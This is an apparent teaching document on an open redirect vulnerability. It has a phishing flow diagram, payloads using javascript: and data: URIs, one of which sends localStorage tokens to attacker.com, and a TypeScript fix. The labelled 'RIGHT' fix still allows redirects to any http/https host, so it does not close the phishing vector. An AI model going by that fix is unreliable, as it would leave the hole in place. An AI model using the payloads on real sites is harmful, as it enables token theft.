# 06-BUGS.md — Simple Redirector (M16)

## The Bug: Open Redirect Vulnerability

### WHAT

The buggy implementation accepts ANY URL without validation and issues a redirect to it. This creates an **open redirect** — the attacker can use your trusted domain to redirect users to arbitrary destinations.

### WHY IT HAPPENS

The developer assumed that since the endpoint requires a POST request with a JSON body, only legitimate frontend applications would call it. They did not consider that an attacker could craft a malicious link or form submission that exploits the redirect.

### ATTACK FLOW DIAGRAM

```
Attacker crafts a phishing email:

┌─────────────────────────────────────────────────────────────┐
│  From: security@trusted-bank.com                            │
│  Subject: Verify your account                               │
│                                                             │
│  Click here to verify:                                      │
│  https://trusted-bank.com/redirect?url=https://evil.com     │
│                                                             │
│  (User sees trusted-bank.com and clicks)                    │
└─────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────┐
│  Browser visits trusted-bank.com/redirect?url=https://evil  │
│                                                             │
│  Server returns:                                            │
│  HTTP/1.1 302 Found                                         │
│  Location: https://evil.com                                 │
│                                                             │
│  Browser follows redirect to evil.com                       │
└─────────────────────────────────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────────────────┐
│  evil.com displays a fake login page identical to           │
│  trusted-bank.com                                           │
│                                                             │
│  User enters username and password.                         │
│  Credentials are sent to evil.com.                          │
└─────────────────────────────────────────────────────────────┘
```

### ATTACK VECTORS

**Vector 1: Phishing**

```
POST /redirect
{ "url": "https://evil-phishing-site.com/login" }

Result: Browser redirects to evil site.
User sees trusted domain in email/history, trusts it.
```

**Vector 2: XSS via `javascript:` protocol**

```
POST /redirect
{ "url": "javascript:alert(document.cookie)" }

Result: Browser executes JavaScript in the context of the original site.
Attacker steals cookies, localStorage, and makes authenticated requests.
```

**Vector 3: Data Exfiltration via `data:` URI**

```
POST /redirect
{ "url": "data:text/html,<script>fetch('https://attacker.com/steal?c='+localStorage.token)</script>" }

Result: Browser loads a data URI that exfiltrates tokens.
```

**Vector 4: OAuth Authorization Code Theft**

```
OAuth authorize endpoint:
https://trusted-provider.com/oauth/authorize?
  client_id=...
  &redirect_uri=https://evil-site.com/callback

If the provider does not validate redirect_uri,
the authorization code is sent to the attacker.
```

### REAL-WORLD BREACHES

**Facebook (2014):** Multiple open redirect vulnerabilities in `facebook.com/l.php?u=` allowed attackers to redirect users to phishing pages. The `l.php` endpoint was designed for external link tracking but did not validate destinations. Attackers used it in mass phishing campaigns.

**Google Accounts (2016):** Open redirects in Google's authentication flow were abused to steal OAuth tokens. Researchers demonstrated that `accounts.google.com` redirect endpoints could be tricked into sending tokens to attacker-controlled domains.

**Major Banks (ongoing):** Marketing teams demand "redirect after login" features. Without strict validation, these become open redirects. Penetration testers consistently find open redirects in bank login flows.

### THE FIX

Validate every URL before redirecting:

```typescript
// WRONG
app.post("/redirect", (req, res) => {
  res.redirect(req.body.url); // Any URL!
});

// RIGHT
const ALLOWED_PROTOCOLS = new Set(["http:", "https:"]);

function isValidRedirectUrl(url: string): boolean {
  try {
    const parsed = new URL(url);
    if (!ALLOWED_PROTOCOLS.has(parsed.protocol)) return false;
    if (!parsed.hostname) return false;
    return true;
  } catch {
    return false;
  }
}

app.post("/redirect", (req, res) => {
  const { url } = req.body;
  if (!isValidRedirectUrl(url)) {
    return res.status(400).json({ error: "Invalid or unsafe URL" });
  }
  res.redirect(302, url);
});
```

### WRONG vs RIGHT

| WRONG (Buggy) | RIGHT (Fixed) |
|---------------|---------------|
| `res.redirect(url)` with no validation | `new URL(url)` + protocol whitelist |
| Accept `javascript:`, `data:`, `file:` | Only allow `http:` and `https:` |
| Use `301` for dynamic redirects | Use `302` for dynamic redirects |
| No hostname check | Reject empty hostnames |

## SOURCES

- [OWASP Unvalidated Redirects Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [CWE-601: URL Redirection to Untrusted Site](https://cwe.mitre.org/data/definitions/601.html)
- PortSwigger, "Open Redirect Vulnerabilities," 2023.
